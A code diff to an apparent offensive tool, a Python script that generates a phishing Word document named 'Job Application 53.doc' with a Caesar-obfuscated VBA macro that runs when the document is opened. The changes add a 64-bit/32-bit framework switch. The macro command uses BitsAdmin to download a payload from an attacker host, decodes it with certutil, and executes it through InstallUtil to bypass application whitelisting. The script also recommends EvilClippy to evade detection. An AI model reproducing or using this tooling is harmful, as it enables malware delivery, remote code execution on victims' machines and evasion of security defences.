@@ -4,6 +4,14 @@ import ak
 CAESAR_NUM = 17
 DOC_NAME = "Job Application 53.doc"
 
+# Change to false if needing a 32-bit version
+IS_64BIT = True
+
+if IS_64BIT:
+    FRAMEWORK = "Framework64"
+else:
+    FRAMEWORK = "Framework"
+
 VBA_MACRO = """
 Function Pears(Beets)
     Pears = Chr(Beets - {CAESAR_NUM})
@@ -45,7 +53,7 @@ Sub Document_Open()
     MyMacro
 End Sub
 """
-CMD = f"cmd.exe /c BitsAdmin /Transfer myJob http://{ak.LHOST}/Bypass.txt C:\\Windows\\tasks\\bp.txt && certutil -f -decode C:\\Windows\\tasks\\bp.txt C:\\Windows\\tasks\\bp && del C:\\Windows\\tasks\\bp.txt && C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\tasks\\bp"
+CMD = f"cmd.exe /c BitsAdmin /Transfer myJob http://{ak.LHOST}/Bypass.txt C:\\Windows\\tasks\\bp.txt && certutil -f -decode C:\\Windows\\tasks\\bp.txt C:\\Windows\\tasks\\bp && del C:\\Windows\\tasks\\bp.txt && C:\\Windows\\Microsoft.NET\\{FRAMEWORK}\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\tasks\\bp"
 
 
 def encrypt_string(text):
@@ -101,7 +109,7 @@ def main():
     print("Document saved as: "+DOC_NAME)
     print("Macro will run: " + CMD)
     print("Use EvilClippy to further hide detection")
-    print("REMEMBER: 32bit only")
+    print("REMEMBER to re-save macro using Word")
 
 
 if __name__ == "__main__":
